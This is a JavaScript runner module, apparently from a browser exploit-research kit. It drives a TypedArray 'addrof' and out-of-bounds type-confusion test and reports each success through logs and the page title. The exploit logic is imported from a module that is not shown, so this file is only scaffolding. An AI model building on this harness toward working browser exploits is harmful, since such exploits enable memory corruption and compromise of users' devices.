// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_FixBugsAndConfirmGetterControl,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_FixBugsAndConfirmGetterControl"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_FixBugsAndConfirmGetterControl(); 

    if (result.errorOccurred) { 
        logS3(`   RUNNER: Teste principal capturou ERRO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}: MainTest ERR!`; 
    } else if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
        logS3(`   RUNNER: Teste de Iteração de Valores OOB Concluído.`, "good", FNAME_RUNNER);
        // Log detalhado de cada iteração já foi feito no execute...
        // Apenas logar os detalhes da "iteração de reporte" (última ou primeira bem-sucedida)
        logS3(`   RUNNER: Detalhes da iteração reportada (via result.toJSON_details): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "info", FNAME_RUNNER);
        logS3(`   RUNNER: Stringify Output da iteração reportada: ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);

        let heisenbugOnM2InReportedIter = false;
        if (result.toJSON_details && result.toJSON_details.this_is_M2 && result.toJSON_details.this_type === '[object Object]') {
            heisenbugOnM2InReportedIter = true;
        }
        let anyAddrofSuccessInReportedIter = false;
        if ((result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success)) {
            anyAddrofSuccessInReportedIter = true;
        }

        // Logar resultados de addrof da iteração reportada
        if (result.addrof_A_result) logS3(`    ADDROF M2.Getter (Iter Reportada): ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        if (result.addrof_B_result) logS3(`    ADDROF M2.Direct (Iter Reportada): ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        
        // Determinar título final baseado no resumo de todas as iterações
        let overallSuccess = result.iteration_results_summary.some(r => r.getter_success || r.direct_success);
        let firstSuccessParams = "";
        if(overallSuccess){
            let successIter = result.iteration_results_summary.find(r => r.getter_success || r.direct_success);
            firstSuccessParams = successIter ? `Val${successIter.oob_value}` : "";
        }
        let overallM2TC = result.iteration_results_summary.some(r => r.m2_tc_confirmed);


        if (overallSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}: AddrInM2 SUCCESS @ ${firstSuccessParams}!`;
        } else if (overallM2TC) { // Se houve TC em M2 em alguma iteração, mas sem addrof
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}: M2_TC OK, Addr Fail`;
        } else { // Nenhuma TC em M2 em nenhuma iteração
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}: All Iter Tested, No M2_TC?`;
        }
    } else {
        logS3(`   RUNNER: Nenhuma iteração de resultado encontrada.`, "warn", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}: No Iter Results`;
    }

    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Heisenbug (${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC}) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    // Ajuste final do título
    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Tested") && !document.title.includes("M2_TC OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81A_FBCGC} Iterations Done`;
        }
    }
}
